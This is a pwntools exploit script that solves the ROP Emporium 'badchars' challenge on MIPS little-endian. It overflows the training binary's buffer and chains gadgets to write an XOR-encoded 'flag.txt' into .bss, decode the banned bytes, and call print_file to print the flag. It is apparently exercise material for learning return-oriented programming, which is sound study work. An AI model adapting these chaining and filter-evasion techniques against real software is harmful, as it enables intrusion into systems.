#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time


# ROPemporium badchars MIPSEL

# Set up pwntools for the correct architecture
elf = context.binary = ELF('badchars_mipsel')
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

gs='''
b *pwnme+444
c
'''

def xorchain(chain, bytes, mask):
    r=b""
    for i,c in enumerate(chain):
        if bytes&0x80:
            c=c^mask
        r+=chr(c).encode()
        bytes= bytes<<1
    return r

# Gadgets
# lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10
g_write = 0x00400930

# lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; lw $t2, ($t1) ; xor $t0, $t0, $t2 ; sw $t0, ($t1) ; jalr $t9 ; addi $sp, $sp, 0x10
g_xor = 0x00400948

# lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; addi $sp, $sp, 0xc
g_set_a0_and_call = 0x00400968

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


print_file = elf.plt["print_file"]
bssaddr = elf.get_section_by_name('.bss').header['sh_addr']

log.info(f"{bssaddr=:x}")
log.info(f"{print_file=:x}")



offset=0x24
flagxored = xorchain(b"flag.txt",0b00111010,3)

PL=b"A"*offset
# first gadget write "flbd"
PL+=p32(g_write)    
PL+=p32(0xdeadbeef)        # junk
PL+=flagxored[:4]          # t1
PL+=p32(bssaddr)           # t0
PL+=p32(g_write)           # t9 => next gadget

# Secon gadget write "-t{t"
PL+=p32(0xf00df00d) 	   # junk
PL+=flagxored[4:8]         # t1
PL+=p32(bssaddr+4)         # t0

# xor each modified char
# 2 3 4 6
for idx in [2,3,4,6]:
    PL+=p32(g_xor)          # t9 => next gadget pop by prior gadget
    PL+=p32(0xdeadbeef)     # junk
    PL+=p32(bssaddr+idx)    # t1
    PL+=p32(3)              # t0

PL+=p32(g_set_a0_and_call)  # t9 => next gadget for prior 
PL+=p32(0xaaaaaaaa)         # junk for addi $sp, $sp, 0x10

# call print_file(@.bss)
PL+=p32(print_file)        # t9
PL+=p32(bssaddr)           # a0

log.info(f"Payload size : 0x{len(PL):x}")
log.info(PL.hex())
io.sendlineafter(b"> ",PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()

